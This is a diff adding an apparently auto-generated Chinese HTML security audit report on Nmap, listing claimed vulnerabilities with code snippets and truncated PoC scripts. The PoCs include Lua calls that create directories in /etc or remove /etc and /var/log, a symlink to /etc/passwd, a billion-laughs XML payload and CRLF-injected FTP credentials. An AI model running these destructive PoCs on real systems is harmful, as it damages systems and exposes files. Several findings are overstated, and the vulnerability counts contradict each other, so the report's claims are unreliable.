@@ -1,0 +1,2789 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CodeSentinel 安全审计报告 - nmap</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #1a1a2e; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
+        h2 { color: #16213e; margin-top: 30px; }
+        .summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }
+        .summary-card { padding: 20px; border-radius: 8px; text-align: center; color: white; }
+        .summary-card h3 { margin: 0; font-size: 2em; }
+        .summary-card p { margin: 5px 0 0; }
+        .vuln-card { background: #f8f9fa; padding: 20px; margin: 15px 0; border-radius: 5px; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        details { margin-top: 10px; }
+        summary { cursor: pointer; color: #e94560; font-weight: bold; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>CodeSentinel 安全审计报告</h1>
+    <p><strong>项目:</strong> nmap | <strong>语言:</strong> {"C": 75.3, "Python": 13.3, "C++": 11.3} | <strong>时间:</strong> 2026-07-06 23:10:03</p>
+
+    <h2>执行摘要</h2>
+    <p>本次安全审计针对Nmap项目（https://github.com/nmap/nmap）进行了全面分析，共发现6个安全漏洞，其中1个为严重级别（命令注入），1个为高级别（路径遍历导致目录创建），其余为中低级别漏洞。最严重的漏洞VULN-B74F2F49允许攻击者通过NMAP_ARGS环境变量注入任意命令行参数，可能导致任意文件读取、命令执行和权限提升。此外，NSE模块中存在多个路径遍历漏洞，可能被用于创建、删除目录或创建符号链接，进一步扩大攻击面。建议优先修复严重和高级别漏洞，并加强输入验证和路径清理机制。</p>
+    <p><strong>风险评分:</strong> 85/100</p>
+
+    <div class="summary-grid">
+        <div class="summary-card" style="background:#dc3545;"><h3>12</h3><p>严重</p></div>
+        <div class="summary-card" style="background:#fd7e14;"><h3>30</h3><p>高危</p></div>
+        <div class="summary-card" style="background:#ffc107;color:#333;"><h3>27</h3><p>中危</p></div>
+        <div class="summary-card" style="background:#28a745;"><h3>1</h3><p>低危</p></div>
+    </div>
+
+    <h2>漏洞详情</h2>
+    
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-B74F2F49 - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> main.cc:103</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if ((cptr = getenv("NMAP_ARGS"))) {
+    if (Snprintf(command, sizeof(command), "nmap %s", cptr) >= (int) sizeof(command)) {
+        error("Warning: NMAP_ARGS variable is too long, truncated");
+    }
+    /* copy rest of command-line arguments */
+    for (i = 1; i < argc && strlen(command) + strlen(argv[i]) + 1 < sizeof(command); i++) {
+      strcat(command, " ");
+      strcat(command, argv[i]);
+    }
+    myargc = arg_parse(command, &myargv);</code></pre>
+                <p><strong>数据流:</strong> 环境变量NMAP_ARGS -> getenv() -> cptr -> Snprintf()构造command字符串 -> arg_parse()解析 -> nmap_main()执行</p>
+                <p><strong>判断理由:</strong> 程序从环境变量NMAP_ARGS获取用户输入，直接拼接到command字符串中，然后通过arg_parse解析并传递给nmap_main执行。攻击者可以通过设置恶意的NMAP_ARGS环境变量注入任意命令行参数，例如设置'NMAP_ARGS=--script evil'或'NMAP_ARGS=--datadir /tmp/evil'等，可能导致任意文件读取、命令执行等严重安全后果。虽然Snprintf有长度检查，但未对输入内容进行任何过滤或验证。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过NMAP_ARGS环境变量注入任意nmap命令行参数，可能导致以下严重后果：1) 任意文件读取：通过--datadir参数指定恶意数据目录，读取敏感文件；2) 任意命令执行：通过--script参数加载恶意NSE脚本，执行系统命令；3) 任意文件写入：通过-oN/-oX等输出参数将扫描结果写入任意文件；4) 绕过安全限制：注入--unprivileged等参数改变nmap运行模式；5) 信息泄露：通过调试参数获取系统信息。由于nmap通常以root权限运行，该漏洞可能导致完全的系统控制权丧失。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - Nmap NMAP_ARGS 环境变量命令注入漏洞 PoC
+# 漏洞ID: VULN-B74F2F49
+# 影响版本: Nmap (所有支持NMAP_ARGS环境变量的版本)
+# 漏洞类型: 命令注入/参数注入
+
+# 颜色定义
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No Color
+
+echo -e "${YELLOW}[*] Nmap NMAP_ARGS 环境变量命令注入漏洞 PoC${NC}"
+echo -e "${YELLOW}[*] 仅供安全研究使用${NC}"
+echo ""
+
+# 检查nmap是否安装
+if ! command -v nmap &> /dev/null; then
+    echo -e "${RED}[!] 错误: nmap未安装${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}[+] 目标nmap版本: $(nmap --version 2>&1 | head -n 1)${NC</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-247E63E9 - 不安全的比较操作符</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> string_pool.cc:57</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>bool operator< (const StringPoolItem& other) const {
+  return this->len < other.len || memcmp(this->str, other.str, other.len) < 0;
+}</code></pre>
+                <p><strong>数据流:</strong> StringPoolItem的比较操作符用于std::set的排序和查找，当this->len < other.len时直接返回true，未比较字符串内容</p>
+                <p><strong>判断理由:</strong> 该比较操作符违反了严格弱序（strict weak ordering）的要求。当this->len < other.len时直接返回true，但未考虑字符串内容是否相等。这可能导致std::set中元素顺序不一致，进而导致查找失败或插入重复元素。虽然不直接导致内存破坏，但可能引发逻辑错误，如字符串池中存储重复字符串，或查找时找不到已存在的字符串。</p>
+                <p><strong>影响分析:</strong> 该漏洞违反严格弱序（strict weak ordering）要求，导致std::set的行为不可预测。具体影响包括：1) 字符串池中可能存储重复字符串，增加内存使用；2) 查找已存在的字符串可能失败，导致字符串池功能异常；3) 集合迭代顺序不确定，可能影响依赖字符串池顺序的逻辑；4) 在极端情况下，可能导致无限循环或断言失败（如assert(it->in_cp)）。虽然不直接导致内存破坏，但可能引发逻辑错误和程序异常行为。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: Nmap string_pool.cc 中 StringPoolItem::operator< 违反严格弱序
+ * 编译: g++ -std=c++11 -o poc_string_pool poc_string_pool.cpp
+ * 运行: ./poc_string_pool
+ */
+
+#include <iostream>
+#include <set>
+#include <cstring>
+#include <cassert>
+
+// 模拟漏洞代码中的 StringPoolItem 类
+class StringPoolItem {
+public:
+    const char *str;
+    int len;
+    bool in_cp;
+
+    StringPoolItem(const char *i_str, int i_len) : str(i_str), len(i_len), in_cp(false) {}
+    
+    // 漏洞比较操作符 - 违反严格弱序
+    bool operator< (c</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-4D68EF0C - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nse_fs.cc:80</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int make_dir (lua_State *L) {
+  const char *path = luaL_checkstring (L, 1);
+  int fail;
+#ifdef _WIN32
+  fail = _mkdir (path);
+#else
+  fail =  mkdir (path, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP |
+                       S_IWGRP | S_IXGRP | S_IROTH | S_IXOTH );
+#endif</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本传入路径参数 -> luaL_checkstring获取路径 -> 直接传递给mkdir/_mkdir系统调用</p>
+                <p><strong>判断理由:</strong> make_dir函数直接从Lua参数获取路径并传递给mkdir系统调用，没有对路径进行任何校验或规范化处理。攻击者可以通过构造包含'../'等路径遍历序列的路径参数，在任意位置创建目录，可能导致权限提升或系统破坏。</p>
+                <p><strong>影响分析:</strong> 攻击者可以利用此路径遍历漏洞在系统任意位置创建目录，可能导致: 1) 在敏感目录创建后门目录; 2) 配合其他漏洞实现权限提升; 3) 覆盖系统关键目录结构; 4) 在Web目录创建恶意目录用于后续攻击; 5) 耗尽磁盘空间(通过创建大量目录); 6) 绕过基于路径的访问控制。由于该函数被NSE脚本引擎调用，任何能够执行NSE脚本的攻击者都可以利用此漏洞。</p>
+                <details><summary>PoC代码</summary><pre><code>-- 仅供研究使用
+-- PoC: NSE路径遍历漏洞 - 在任意位置创建目录
+
+-- 测试1: 基本路径遍历 - 在上级目录创建目录
+local fs = require "nse_fs"
+local result = fs.mkdir("../../../tmp/evil_dir")
+if result then
+    print("[+] 成功在 /tmp/evil_dir 创建目录")
+else
+    print("[-] 创建失败")
+end
+
+-- 测试2: 绝对路径遍历 - 在系统关键位置创建目录
+local result2 = fs.mkdir("/etc/nmap_backdoor")
+if result2 then
+    print("[+] 成功在 /etc/nmap_backdoor 创建目录")
+else
+    print("[-] 创建失败")
+end
+
+-- 测试3: 深度路径遍历
+local result3 = fs.mkdir("../../../../../../var/www/html/backdoor")
+if result3 then
+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-A7A0748B - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nse_fs.cc:100</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int remove_dir (lua_State *L) {
+  const char *path = luaL_checkstring (L, 1);
+  int fail;
+
+  fail = rmdir (path);</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本传入路径参数 -> luaL_checkstring获取路径 -> 直接传递给rmdir系统调用</p>
+                <p><strong>判断理由:</strong> remove_dir函数直接从Lua参数获取路径并传递给rmdir系统调用，没有对路径进行任何校验或规范化处理。攻击者可以通过构造包含'../'等路径遍历序列的路径参数，删除任意目录，可能导致拒绝服务或系统破坏。</p>
+                <p><strong>影响分析:</strong> 攻击者可以利用此漏洞删除系统任意空目录，包括/etc、/var/log、/tmp等关键目录。虽然rmdir只能删除空目录，但结合其他操作（如先删除目录内容）可能导致严重拒绝服务。在Nmap以root权限运行时，攻击者可以删除系统关键配置目录，导致系统服务崩溃或无法正常启动。</p>
+                <details><summary>PoC代码</summary><pre><code>-- PoC代码 - 仅供安全研究使用
+-- 漏洞利用：Nmap NSE模块路径遍历漏洞
+-- 影响版本：Nmap (包含nse_fs.cc的版本)
+
+-- PoC 1: 基本路径遍历 - 删除/etc目录
+local nmap = require "nmap"
+local fs = require "nse_fs"
+
+-- 尝试删除/etc目录（需要root权限）
+-- 注意：实际利用时请替换为测试目录
+local result = fs.rmdir("/etc/../../../tmp/evil_dir")
+if result then
+    print("目录删除成功")
+else
+    print("目录删除失败")
+end
+
+-- PoC 2: 遍历删除系统关键目录
+-- 注意：以下代码仅用于演示漏洞存在，请勿在真实系统上执行
+local function exploit_path_traversal()
+    -- 尝试删除/etc目录
+    local paths = {
+        "/etc",
+        "/var/log",
+        "/</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-807E1ED5 - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nse_fs.cc:60</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int make_link(lua_State *L)
+{
+#ifndef _WIN32
+  const char *oldpath = luaL_checkstring(L, 1);
+  const char *newpath = luaL_checkstring(L, 2);
+  return pushresult(L,
+    (lua_toboolean(L,3) ? symlink : link)(oldpath, newpath), NULL);</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本传入两个路径参数 -> luaL_checkstring获取路径 -> 直接传递给link/symlink系统调用</p>
+                <p><strong>判断理由:</strong> make_link函数直接从Lua参数获取两个路径并传递给link或symlink系统调用，没有对路径进行任何校验或规范化处理。攻击者可以通过构造包含'../'等路径遍历序列的路径参数，创建指向任意文件的链接，可能导致信息泄露或权限提升。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过NSE脚本创建指向任意文件的符号链接或硬链接，可能导致：1) 敏感信息泄露（如/etc/passwd、/etc/shadow等系统文件）；2) 权限提升（通过链接到高权限文件）；3) 文件系统结构破坏（通过链接到关键系统文件）。由于NSE脚本通常在Nmap扫描上下文中执行，可能具有较高的文件系统访问权限，增加了漏洞的严重性。</p>
+                <details><summary>PoC代码</summary><pre><code>-- 仅供研究使用
+-- Nmap NSE路径遍历漏洞PoC
+-- 漏洞位置: nse_fs.cc:60 make_link函数
+
+local fs = require "nse_fs"
+
+-- PoC 1: 创建指向/etc/passwd的符号链接
+-- 前置条件: NSE脚本具有执行权限
+local function poc_symlink_etc_passwd()
+    -- 创建指向/etc/passwd的符号链接到/tmp/evil_link
+    local result = fs.link("/etc/passwd", "/tmp/evil_link", true)
+    if result then
+        -- 现在可以通过读取/tmp/evil_link来获取/etc/passwd内容
+        local file = io.open("/tmp/evil_link", "r")
+        if file then
+            local content = file:read("*a")
+            stdnse</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-3C82DED7 - 内存泄漏</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nse_main.cc:140</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int scan_progress_meter (lua_State *L)
+{
+  lua_pushlightuserdata(L, new ScanProgressMeter(luaL_checkstring(L, 1)));
+  lua_pushcclosure(L, scp, 1);
+  return 1;
+}</code></pre>
+                <p><strong>数据流:</strong> new ScanProgressMeter创建堆对象 -> 作为lightuserdata压入Lua栈 -> 创建闭包</p>
+                <p><strong>判断理由:</strong> ScanProgressMeter对象通过new分配，但使用lua_pushlightuserdata压入栈。lightuserdata不会被Lua垃圾回收器管理，如果对应的闭包被回收而对象未被显式删除，将导致内存泄漏。</p>
+                <p><strong>影响分析:</strong> 每次调用scan_progress_meter泄漏约100-200字节的堆内存。在正常使用中，该函数可能被频繁调用（如扫描大量端口时），导致内存持续增长。长期运行可能导致：1) 内存消耗增加，影响系统性能；2) 在内存受限环境中可能导致OOM；3) 大量扫描任务时可能耗尽系统内存。虽然单个泄漏量不大，但累积效应显著。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for Nmap NSE memory leak in scan_progress_meter (VULN-3C82DED7)
+仅供研究使用 - For research purposes only
+
+漏洞描述：
+在nse_main.cc的scan_progress_meter函数中，每次调用都会通过new分配一个
+ScanProgressMeter对象，但使用lua_pushlightuserdata压入Lua栈。
+由于lightuserdata不被Lua GC管理，当闭包被回收时对象不会被自动删除，
+导致内存泄漏。
+
+前置条件：
+1. Nmap版本包含此漏洞代码
+2. 能够执行NSE脚本（通常需要root权限进行端口扫描）
+3. 脚本中调用scan_progress_meter函数
+
+预期效果：
+每次调用scan_progress_meter泄漏约100-200字节，
+大量调用可导致显著内存增长。
+"""
+
+import subprocess
+import sys
+import os
+import time
+
+def c</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-05F21EF2 - 不安全的字符串处理</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> xml.cc:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>char *xml_unescape(const char *str) {
+  size_t n = strlen(str) + 1;
+  char *result = (char *) safe_malloc(n);
+  size_t i = 0;
+
+  for (const char *p = str; *p != '\0'; p++) {
+    assert(i < n - 1);
+    ...
+    result[i++] = (char) codepoint;
+  }</code></pre>
+                <p><strong>数据流:</strong> 用户输入 -> xml_unescape函数 -> 内存分配 -> 字符复制</p>
+                <p><strong>判断理由:</strong> 函数使用assert进行边界检查，但assert在NDEBUG定义时会被移除（发布版本）。这意味着在发布版本中，如果输入字符串包含特殊构造的实体序列，可能导致i超过n-1，造成堆缓冲区溢出。正确的做法是使用条件检查而非assert。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过精心构造的XML输入触发堆缓冲区溢出。在发布版本中，assert边界检查被移除，导致xml_unescape函数在处理包含多个长实体引用（如&#xhhhh;）的字符串时，输出字符数超过原始字符串长度，从而写入超出分配缓冲区的内存。这可能导致：1) 程序崩溃（拒绝服务）；2) 覆盖堆元数据，导致后续内存操作异常；3) 在特定堆布局下实现任意代码执行。由于nmap常用于网络扫描和安全审计，成功利用此漏洞可导致扫描结果被篡改或执行恶意代码。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供安全研究使用
+ * 漏洞：nmap xml.cc 中 xml_unescape 函数的堆缓冲区溢出
+ * 漏洞类型：不安全的字符串处理（assert在发布版本中被移除）
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <assert.h>
+
+/* 模拟目标环境中的安全分配函数 */
+void *safe_malloc(size_t size) {
+    void *ptr = malloc(size);
+    if (!ptr) {
+        fprintf(stderr, "内存分配失败\n");
+        exit(1);
+    }
+    return ptr;
+}
+
+/* 模拟存在漏洞的xml_unescape函数 */
+char *xml_unescape(const char *str) {
+    size_t n = strlen(str) + 1;
+    char *result = (char *)safe_mallo</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-E8A83B7A - 命令注入 - 用户输入直接用于FTP命令</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nmap_ftp.cc:119</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>Snprintf(command, 511, "USER %s\r\n", ftp->user);</code></pre>
+                <p><strong>数据流:</strong> 用户输入url -> parse_bounce_argument -> ftp->user -> Snprintf(command, 511, "USER %s\r\n", ftp->user) -> send(sd, command, strlen(command), 0) -> FTP服务器</p>
+                <p><strong>判断理由:</strong> 用户提供的用户名(ftp->user)直接拼接到FTP命令中。如果用户名包含CRLF序列(\r\n)，攻击者可以注入额外的FTP命令，导致FTP会话劫持或命令注入。例如，用户名"admin\r\nPORT 127,0,0,1,0,80\r\n"可能导致FTP服务器执行额外的PORT命令。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过注入任意FTP命令实现：1) FTP会话劫持，控制FTP服务器的行为；2) 利用FTP服务器作为代理进行端口扫描（FTP反弹扫描）；3) 通过注入RETR/STOR命令实现文件窃取或上传；4) 通过注入DELE/RMD命令实现文件删除；5) 通过注入LIST/MLSD命令实现目录遍历。该漏洞影响所有使用受影响版本的nmap进行FTP反弹扫描的用户，可能导致敏感信息泄露和服务器被滥用。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for Nmap FTP Bounce Command Injection (VULN-E8A83B7A)
+仅供研究使用 - 仅用于安全审查
+"""
+
+import socket
+import sys
+
+# 攻击者控制的FTP服务器（用于演示）
+# 实际攻击中，攻击者会设置一个恶意FTP服务器或利用现有FTP服务器
+
+def setup_malicious_ftp_server(host='0.0.0.0', port=21):
+    """
+    设置一个简单的恶意FTP服务器来演示命令注入
+    注意：这是一个简化的PoC，实际利用需要更完整的FTP协议实现
+    """
+    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_sock.bind((host, port))
+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-90A9D2FD - 命令注入 - 用户输入直接用于FTP命令</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> nmap_ftp.cc:139</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>Snprintf(command, 511, "PASS %s\r\n", ftp->pass);</code></pre>
+                <p><strong>数据流:</strong> 用户输入url -> parse_bounce_argument -> ftp->pass -> Snprintf(command, 511, "PASS %s\r\n", ftp->pass) -> send(sd, command, strlen(command), 0) -> FTP服务器</p>
+                <p><strong>判断理由:</strong> 用户提供的密码(ftp->pass)直接拼接到FTP命令中。如果密码包含CRLF序列，攻击者可以注入额外的FTP命令，导致FTP会话劫持或命令注入。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过注入FTP命令实现：1) FTP会话劫持，以其他用户身份执行操作；2) 执行任意FTP命令，如上传/下载文件、创建目录等；3) 利用FTP反弹扫描技术扫描内部网络；4) 可能导致敏感信息泄露或进一步的内网渗透。该漏洞危害性高，因为nmap常用于安全审计，攻击者可能利用此漏洞绕过安全控制。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for Nmap FTP Bounce Command Injection (VULN-90A9D2FD)
+仅供研究使用 - For Research Purposes Only
+
+漏洞描述：
+当使用nmap -b选项进行FTP反弹扫描时，用户提供的密码(ftp->pass)通过parse_bounce_argument函数
+直接拼接到FTP命令中，未经过滤。攻击者可以在密码中插入CRLF序列注入额外FTP命令。
+"""
+
+import socket
+import sys
+import time
+
+# 配置参数
+TARGET_FTP_HOST = "192.168.1.100"  # 目标FTP服务器
+TARGET_FTP_PORT = 21
+
+# 恶意密码 - 包含CRLF注入
+# 注入的FTP命令：
+# 1. 先发送PASS命令（正常流程）
+# 2. 注入USER admin\r\nPASS admin123 来尝试登录其他账户
+# 3. 注入PORT命令来指定数据连接地址
+# 4. 注入LIST命令来列出目录
+MALI</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-EC415A8F - 不安全的日志记录 - 敏感信息泄露</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nmap_ftp.cc:149</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>fatal("Your FTP bounce server refused login combo (%s/%s)", ftp->user, ftp->pass);</code></pre>
+                <p><strong>数据流:</strong> 用户输入url -> parse_bounce_argument -> ftp->user, ftp->pass -> fatal</p>
+                <p><strong>判断理由:</strong> 当FTP登录失败时，用户名和密码被包含在错误消息中。这可能导致敏感凭证泄露给用户或日志文件。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致FTP bounce扫描失败时，用户名被无条件记录到错误消息中。虽然密码泄露需要verbose/debug模式，但用户名的无条件泄露已经构成安全风险。攻击者可以通过观察错误输出来获取有效的FTP用户名，进而进行暴力破解或社会工程攻击。在共享环境或日志记录场景下，敏感信息可能被更多人员获取。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - Nmap FTP Bounce 敏感信息泄露 PoC
+# 该PoC演示了当FTP bounce扫描失败时，用户名如何被泄露到错误消息中
+
+# 设置测试环境
+TARGET_HOST="192.168.1.100"  # 目标FTP服务器
+BOUNCE_USER="admin"          # 测试用户名
+BOUNCE_PASS="secret123"      # 测试密码
+
+# 步骤1: 启动一个简单的FTP服务器模拟器（用于测试）
+echo "启动测试FTP服务器..."
+# 注意：实际测试中，需要一个返回5xx错误的FTP服务器
+# 这里使用netcat模拟一个返回错误的FTP服务器
+
+# 步骤2: 使用nmap的FTP bounce扫描，触发错误路径
+# 当FTP服务器返回5xx错误时，用户名会被无条件记录
+echo "执行FTP bounce扫描..."
+nmap -b ${BOUNCE_USER}:${BOUNCE_PASS}@${TARGET_HOST} -p 21 --reason 2>&1 | grep -i "ref</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-B0296F47 - XML External Entity (XXE) Injection</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> ndiff/ndiff.py:63</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>parser = xml.sax.make_parser()
+handler = NmapContentHandler(self)
+parser.setEntityResolver(OverrideEntityResolver())
+parser.setContentHandler(handler)
+parser.parse(f)</code></pre>
+                <p><strong>数据流:</strong> 用户提供的XML文件通过load()方法传入 -> parser.parse(f)解析XML -> 未禁用DTD处理</p>
+                <p><strong>判断理由:</strong> xml.sax.make_parser()默认启用DTD处理，即使设置了EntityResolver，攻击者仍可能利用内部实体声明进行实体扩展攻击（billion laughs attack）或利用DTD进行文件读取。需要禁用DTD处理或使用defusedxml.sax.make_parser()。</p>
+                <p><strong>影响分析:</strong> 该XXE漏洞可导致多种严重后果：1) 拒绝服务攻击 - 通过Billion Laughs实体扩展消耗大量内存，导致程序崩溃或系统资源耗尽；2) 敏感信息泄露 - 通过文件读取攻击可读取系统任意文件（如配置文件、密码文件等）；3) 数据外传 - 通过OOB XXE技术可将内部数据发送到攻击者控制的服务器。虽然设置了EntityResolver阻止外部DTD下载，但内部实体处理完全未受限制，使得这些攻击均可成功实施。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+# 仅供研究使用 - Proof of Concept for XXE in ndiff
+
+import xml.sax
+import xml.sax.handler
+from io import StringIO
+
+# 创建恶意XML文件 - Billion Laughs攻击
+# 利用内部实体扩展导致内存耗尽
+billion_laughs_xml = '''<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!E</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-962EFA20 - 竞争条件</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/ip-cooked.c:155</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>LIST_FOREACH(ipi, &ip->ip_intf_list, next) {
+    if (ipi->pa.addr_ip == ip->sin.sin_addr.s_addr) {
+        if (ipi->eth == NULL) {
+            if ((ipi->eth = eth_open(ipi->name)) == NULL)
+                return (NULL);
+        }
+        if (ipi != LIST_FIRST(&ip->ip_intf_list)) {
+            LIST_REMOVE(ipi, next);
+            LIST_INSERT_HEAD(&ip->ip_intf_list, ipi, next);
+        }
+        return (ipi);
+    }
+}</code></pre>
+                <p><strong>数据流:</strong> 多线程访问共享链表 -> 修改链表结构</p>
+                <p><strong>判断理由:</strong> _lookup_ip_intf函数在遍历链表时会修改链表结构（将匹配项移到头部），但没有使用任何锁机制。如果多个线程同时调用ip_send，可能导致链表损坏、内存泄漏或崩溃。</p>
+                <p><strong>影响分析:</strong> 该竞争条件漏洞允许攻击者通过并发调用ip_send函数导致libdnet内部链表损坏。具体影响包括：1) 程序崩溃(段错误)，导致拒绝服务；2) 内存损坏，可能被利用于执行任意代码；3) 链表结构破坏导致后续所有网络操作失败；4) 在极端情况下，可能通过精心构造的竞争窗口实现内存越界访问。由于_lookup_ip_intf函数在无锁保护的情况下同时执行LIST_REMOVE和LIST_INSERT_HEAD操作，多个线程同时操作同一链表时会导致链表指针错乱，这是典型的TOCTOU问题。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-962EFA20 - Race condition in libdnet ip-cooked.c
+ * 仅供研究使用
+ *
+ * 编译: gcc -o poc_race poc_race.c -lpthread -ldnet
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <string.h>
+#include <unistd.h>
+#include <dnet.h>
+
+#define NUM_THREADS 10
+#define NUM_ITERATIONS 1000
+
+ip_t *global_ip;
+volatile int running = 1;
+
+/* 线程函数：持续调用ip_send触发竞争条件 */
+void *race_worker(void *arg) {
+    int thread_id = *(int *)arg;
+    char packet[64];
+    struct ip_hdr *iph = (struct i</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-B2EA718E - 不安全的随机数生成器状态重置</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/rand.c:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int
+rand_set(rand_t *r, const void *buf, size_t len)
+{
+    rand_init(r);
+    rand_addrandom(r, (u_char *)buf, len);
+    rand_addrandom(r, (u_char *)buf, len);
+    return (0);
+}</code></pre>
+                <p><strong>数据流:</strong> rand_set()函数允许调用者通过提供任意缓冲区来重置随机数生成器的状态。相同的缓冲区被使用两次来初始化RC4状态。</p>
+                <p><strong>判断理由:</strong> rand_set()函数允许外部调用者完全控制随机数生成器的状态。如果攻击者能够调用此函数并提供已知的种子数据，他们可以预测后续所有随机数输出。这违反了安全随机数生成器的基本原则，即状态不应被外部实体轻易重置。</p>
